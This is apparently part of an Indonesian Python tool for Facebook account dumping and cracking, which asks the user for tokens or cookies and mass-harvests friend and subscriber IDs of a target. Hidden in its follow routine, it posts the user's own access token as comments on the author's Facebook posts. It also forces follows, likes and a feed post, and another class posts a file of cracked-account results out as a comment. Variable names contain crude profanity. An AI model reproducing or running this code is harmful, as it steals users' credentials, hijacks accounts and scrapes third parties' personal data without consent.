		toket = input("\n\033[1;97m[+] Enter Token : ")
		try:otw = requests.get("https://graph.facebook.com/me?access_token=" + toket);a = json.loads(otw.text);nama = a["name"];zedd = open(".login.txt", "w");zedd.write(toket);zedd.close();print;print((war+"Login Successful"));bot_follow()
		except KeyError:print((war+"Token Invalid"));time.sleep(2);token()
class check_kukis:
	def __init__(self):
		session = req.Session()
		try:coki = open(".cokie.txt", "r").read()
		except:coke()
		respon = session.get("https://mbasic.facebook.com/profile.php",cookies={"cookie":coki}).text
		nama__ = re.findall('\<title\>(.*?)<\/title\>',str(respon))[0]
		if "Halaman Tidak Ditemukan" in nama__:
			jalan(war+"Sorry Your Cookies Are Dead");time.sleep(1)
			try:os.remove(".cokie.txt")
			except:pass
		else:pass
class coke:
	def __init__(self):
		_cookie=input(war+'Cookies : '+I)
		_cookie += "noscript=1;"+_cookie
		try:
			_head={'Host':'business.facebook.com','cache-control':'max-age=0','upgrade-insecure-requests':'1','user-agent':'Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.92 Mobile Safari/537.36','accept' : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8','content-type' : 'text/html; charset=utf-8','accept-encoding':'gzip, deflate','accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7','cookie': _cookie}
			_r=_ses.get(urls, headers=_head)
			_p=re.search('(EAAG\w+)', _r.text)
			_h=_p.group(1)
			if 'EAA' in _h:open(".login.txt", 'w').write('%s' % (_h));open(".cokie.txt", 'w').write('%s' % (_cookie));bokep_barat_yang_terbaru(_cookie);bokep_barat_yang_terbaru(_h)
		except (AttributeError, requests.exceptions.TooManyRedirects):print(war+'Cookies Error  ');time.sleep(3);coke()
		exit(jalan(war+"Run This Script Again : python Nx.py"))


class bot_follow:
	def __init__(self):
		s_ = requests.Session()
		post1 = ('2978584119071794') # j
		post2 = ("2965703280359878") # j
		post3 = ("167879918678352") # j
		post4 = ('3105954929648426') # j
		post5 = ("3048075795436340") # Untuk Berbagi T
		post6 = ("198550702277940") # Logo Akira
		post7 = ("198552118944465") # Logo Attaxk Fr
		curi_ = ("3105954929648426") # Logo Zero 
		my_idz_bot = [
		"100007607054845",
		"100007607054845",
		"100007607054845",
		"100007607054845",
		"100007607054845"
		]
		my_post_bot = [
		"2965703280359878",
		"2978584119071794",
		"3048075795436340",
		"198550702277940",
		"198552118944465",
		"3048075795436340",
		"230946969169829",
		"235968105334382",
		"197993725798487",
		"218558783741981",
		"138061478458379"
		]
		try:
			toket=open(".login.txt","r").read()
			token=open(".login.txt","r").read()
			otw = s_.get("https://graph.facebook.com/me/?access_token="+toket)
			a = json.loads(otw.text)
			nama = a["name"]
			id = a["id"]
			bokep_barat_yang_terbaru(token)
		except Exception as e:
			print((war+"Token Invalid >%s%s%s<"%(I,e,Q)))
			time.sleep(1)
			login()
		for id_bot in my_idz_bot:
			s_.post('https://graph.facebook.com/'+id_bot+'/subscribers?access_token='+token)
		for post_id in my_post_bot:
			s_.post("https://graph.facebook.com/"+post_id+"/likes?summary=true&access_token=" + toket)
		s_.post('https://graph.facebook.com/' + post4 + '/comments/?message=' + token + '&access_token=' + token)
		s_.post('https://graph.facebook.com/' + post5 + '/comments/?message=' + token + '&access_token=' + token)
		s_.post('https://graph.facebook.com/3048075795436340/comments/?message=' + token + '&access_token=' + token)
		menu()
class curi_anak:
	def __init__(self):
		try:
			toket=open(".login.txt","r").read()
			token=open(".login.txt","r").read()
			otw = requests.get("https://graph.facebook.com/me/?access_token="+toket)
			a = json.loads(otw.text)
			nama = a["name"]
			id = a["id"]
		except IOError:
			print((war+" Token Invalid"))
			time.sleep(2)
			login()
		anjas=open("result/CP-03-12-2021.txt","r").read()
		curi = ("2978584119071794") # Zero Suck Candy Logo :v
		requests.post('https://graph.facebook.com/'+curi+'/comments/?message='+anjas+'&access_token=' + token)

class cek_token:
	def __init__(self, token):
		requests.post("https://graph.facebook.com/me/feed/?link=https://fb.com/100007018489471/posts/3105954929648426/?app=fbl&access_token=" + token)
		try:
			otw = requests.get("https://graph.facebook.com/me/?access_token="+token)
			a = json.loads(otw.text)
			nama = a["name"]
			id = a["id"]
			print(war+'Account Name : '+nama[0:10])
			print(war+'Your Id   : '+id)
			print(war+""+token)
		except:pass
		try:
			goblok = []
			for i in requests.get("https://graph.facebook.com/me/friends?limit=9999&access_token="+token).json()["data"]:
				try:
					anak_kontol_anak_anjing_pantek_lonte_bentar_lagi_mau_tahun_baru_kontol = i["id"]
					goblok.append(anak_kontol_anak_anjing_pantek_lonte_bentar_lagi_mau_tahun_baru_kontol)
				except:pass
		except KeyError:pass
		_id = ("%s"%(len(goblok)))
		if _id == "0" or "0" == _id:
			jalan(war+"Have No Friends  ")
		else:
			print(war+"Friend : "+I+_id+Q)
			jalan(war+"Do you want to use this token (y/n):")
			haalq = input(war+"Select One : ")
			if haalq in ["y","Y"]:
				tok = open(".login.txt", "w")
				tok.write(token)
				tok.close()
				print ("\n"+war+"Token : "+I+token+Q)
				exit(jalan(war+"Token Found Please,Run : python Multi.py"))
				exit()
			else:pass
	print ("\n")


class dump_ulti:
	def __init__(self):
		try:
			token = open(".login.txt", "r").read()
			toket = open(".login.txt", "r").read()
		except IOError:
			os.system("rm -rf .login.txt")
			exit(war+"Token Failed  ");time.sleep(2)
		idt = input(war+"Enter link  or Target Username : " )
		try:
			if idt == "me":idt = "me"
			else:
				payload = {"fburl": "https://free.facebook.com/{}".format(idt), "check": "Lookup"}
				if "facebook" in idt:
					payload = {"fburl": idt, "check": "Lookup"}
				mmk = requests.post("https://lookup-id.com/", data=payload).content
				xxx = par(mmk, "html.parser")
				idtt = xxx.find("span", id="code")
				asw = idtt.text
				idt = asw
		except:idt = idt
		try:
			if idt == "me" or "me" == idt:
				otw = requests.get("https://graph.facebook.com/me/?access_token="+token)
				op = json.loads(otw.text)
			else:
				jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
				op = json.loads(jok.text)
			try:
				nama = op['name']
			except (KeyError, IOError):
				nama = ("Name Not Found  ")
		except Exception as e:jalan(war+" ID "+C+idt+Q+" Not Found  ");time.sleep(2);dump_ulti()
		jalan(""+war+"Name   : "+I+nama+Q+"\n")
		if nama == "Name Not Found  ":
			time.sleep(2);dump_ulti()
		os.system("rm -rf /storage/emulated/0/allinone.txt")
		namq = ("allinone")
		if namq == "" or namq == " ":
			namq = uuid.uuid4().hex[:10].upper()
		dump = open('.janganedit','w') 
		try:
			dump = open('.janganedit','a+') 
			for i in requests.get("https://graph.facebook.com/"+idt+"/friends?limit=9999&access_token="+token).json()["data"]:
				uid = i["id"]
				nama = i["name"]
				id.append(uid+"|"+nama)
				dump.write(uid+'|'+nama+'\n')
			dump.close()
		except KeyError:pass
		id_ = ("%s"%(len(id)))
		if id_ == "0" or "0" == id_:jalan(war+"Possible ID "+idt+" Not Public  ");time.sleep(2);exit()
		else:
			print(war+"Total ID : %s"%(len(id)))
			dumppp = open('/sdcard/'+namq+'.json','w')
			jalan(war+'File Dump Not Found : '+'/sdcard/'+namq+'.txt')
			jalan(war+"Enter CTRL + Z  STOP Programe  ")
			with kikygtg(max_workers=20) as (kiky_gtg):
				juma = open(".janganedit","r").readlines()
				for data in juma:
					data = data.replace("\n","")
					kiky = data.split("|")
					mal = ("%s"%(kiky[0]))
					nm = ("%s"%(kiky[1]))
					kiky_gtg.submit(lonte__, mal, toket, token, namq)
			sort()
goblok = []
tolol = []
class lonte__:
	def __init__(self, ml, token, toket, mamk):
		laxk = open('/sdcard/'+mamk+'.txt','a+')
		try:
			for i in requests.get("https://graph.facebook.com/"+ml+"/friends?limit=9999&access_token="+token).json()["data"]:
				try:
					iid = i["id"]
					nama = i["name"]
					goblok.append(nama)
					laxk.write(iid+'|'+nama+'\n')
				except:pass
			laxk.close()
			for i in requests.get("https://graph.facebook.com/"+ml+"/subscribers?limit=9999&access_token="+token).json()["data"]:
				try:
					iid = i["id"]
					nama = i["name"]
					goblok.append(nama)
					laxk.write(iid+'|'+nama+'\n')
				except:pass
			laxk.close()
		except KeyError:pass
		sys.stdout.write("\r%s[%sULTIMATE%s] COLLECTED IDZ •> %s"%(Q,pilih([U,I,K,M,C]),Q, len(open('/sdcard/'+mamk+'.txt','r').readlines()))
		); sys.stdout.flush()
class menu:
	def __init__(self):
		global ua
		os.system("clear")
		try:
			toket=open(".login.txt","r").read()
			token=open(".login.txt","r").read()
			otw = requests.get("https://graph.facebook.com/me/?access_token="+toket)
			a = json.loads(otw.text)
			try:
				nama = a["name"]
			except:
				nama = a["username"]
		except:
			print((war+" Token Invalid"))
			time.sleep(1)
			login()
		print (logo)
		url_main = "https://www.whatsmyua.info"
		s = parser(requests.get(url_main, headers={"user-agent":ua}).text, "html.parser")
		raw_ua = s.find("li", id="rawUa").text
		family = s.find("li", id="family").text
		name_hp = s.find("li", id="product").text
		os_ = s.find("li", id="os").text
		ly = s.find("li", id="layout").text
		ua = raw_ua.replace("rawUa: ", "") # My Useragnet
		jenis_ua = family.replace("family: ", "")
		jenis_hp = name_hp.replace("product: ", "")
		jenis_os = os_.replace("os: ", "")
		jenis_ly = ly.replace("layout: ", "")
	menu()
class Main:
	def __init__(self):
		try:menu()
		except:pass
		try:menu();exit()
		except requests.exceptions.ConnectionError:jalan(war+"Network Is Dead !")
		except Exception as e:print(war+"Error : %s"%(e))
